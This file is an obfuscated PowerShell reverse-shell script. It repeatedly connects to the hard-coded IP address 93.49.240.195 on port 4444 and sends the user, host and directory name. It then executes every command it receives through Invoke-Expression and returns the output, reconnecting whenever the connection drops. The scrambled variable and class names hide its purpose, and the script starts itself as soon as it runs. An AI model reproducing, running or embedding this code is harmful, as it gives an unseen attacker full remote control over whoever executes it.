class MzhzxbukxyyluUGyRlabGavg {
    
    [string]$RAHktDgEsMTuCIsTM = "93.49.240.195"
    [int]$sxiOxyKikXFRPYFDjTdsfFOt = 4444

    $PgPGOvcO
    $rkGnGKZsvy
    $qXtyBsumWwLzFiShhpxleo
    $owxHd
    $ktoBonLeXihk
    $GZufHa
    [int]$ZddLtEe = 50*1024

    tCJHQjJQJ() {
        $this.rkGnGKZsvy = $false
        while ($true) {
            try {
                $this.rkGnGKZsvy = New-Object Net.Sockets.TcpClient($this.RAHktDgEsMTuCIsTM, $this.sxiOxyKikXFRPYFDjTdsfFOt)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.MVSZZLSlRCvrMbWEanebNtv()
    }

    MVSZZLSlRCvrMbWEanebNtv() {
        $this.PgPGOvcO = $this.rkGnGKZsvy.GetStream()
        $this.owxHd = New-Object Byte[] $this.ZddLtEe
        $this.GZufHa = New-Object Text.UTF8Encoding
        $this.qXtyBsumWwLzFiShhpxleo = New-Object IO.StreamWriter($this.PgPGOvcO, [Text.Encoding]::UTF8, $this.ZddLtEe)
        $this.ktoBonLeXihk = New-Object System.IO.StreamReader($this.PgPGOvcO)
        $this.qXtyBsumWwLzFiShhpxleo.AutoFlush = $true
    }

    EvjWoMBYcDMyXVcO() {
        $this.tCJHQjJQJ()
        $this.EUsXnvp()
    }

    hWmwXskgB($sjakUDeTA) {
        try {
            [byte[]]$doNYgZAfWjJimEdwcuzmr = [text.Encoding]::Ascii.GetBytes($sjakUDeTA)
            $this.qXtyBsumWwLzFiShhpxleo.Write($doNYgZAfWjJimEdwcuzmr, 0, $doNYgZAfWjJimEdwcuzmr.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.EvjWoMBYcDMyXVcO()
        }
    }

    [string] jBIzmHtrfdF() {
        try {
            $PvBKkiJQc = $this.PgPGOvcO.Read($this.owxHd, 0, $this.ZddLtEe)    
            $wLeXUJYCQHkULSnmDuKJUXzV = ($this.GZufHa.GetString($this.owxHd, 0, $PvBKkiJQc))
            return $wLeXUJYCQHkULSnmDuKJUXzV
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.EvjWoMBYcDMyXVcO()
            return ""
        }
    }

    [string] uRyAStDzeFXtqmYEaI($ursKxVKntyzC) {
        Write-Host $ursKxVKntyzC
        try { 
            $ecsZtDYRXzHQfpVODtEKkKWX = Invoke-Expression $ursKxVKntyzC | Out-String
        }
        catch {
            $XBMcAPEfQtGQA = $_.Exception
            $jGHSajoPqVvsjoLXMamTdBE = $_.Message
            $ecsZtDYRXzHQfpVODtEKkKWX = "`n$_`n"
        }
        return $ecsZtDYRXzHQfpVODtEKkKWX
    }

    [string] jrdhqqQgFIjUxwz() {
        $WFDTHEgRSVbopg = [Environment]::UserName
        $BPPRsUzbdtQgUZWoBW = [System.Net.Dns]::GetHostName()
        $KJUePyy = Get-Location
        return "$WFDTHEgRSVbopg@$BPPRsUzbdtQgUZWoBW [$KJUePyy]~$ "
    }

    EUsXnvp() {
        while ($this.rkGnGKZsvy.Connected) {
            $this.hWmwXskgB($this.jrdhqqQgFIjUxwz())         
            $wLeXUJYCQHkULSnmDuKJUXzV = $this.jBIzmHtrfdF()
            $ecsZtDYRXzHQfpVODtEKkKWX = "`n"
            if ([string]::IsNullOrEmpty($wLeXUJYCQHkULSnmDuKJUXzV)) {
                continue
            }
            $ecsZtDYRXzHQfpVODtEKkKWX = $this.uRyAStDzeFXtqmYEaI($wLeXUJYCQHkULSnmDuKJUXzV)
            $this.hWmwXskgB($ecsZtDYRXzHQfpVODtEKkKWX + "`n")
            $this.PgPGOvcO.Flush()
        }
        $this.rkGnGKZsvy.Close()
        $this.EvjWoMBYcDMyXVcO()
    } 
}

$ROfnRpnBQgR = [MzhzxbukxyyluUGyRlabGavg]::new()
$ROfnRpnBQgR.EvjWoMBYcDMyXVcO()
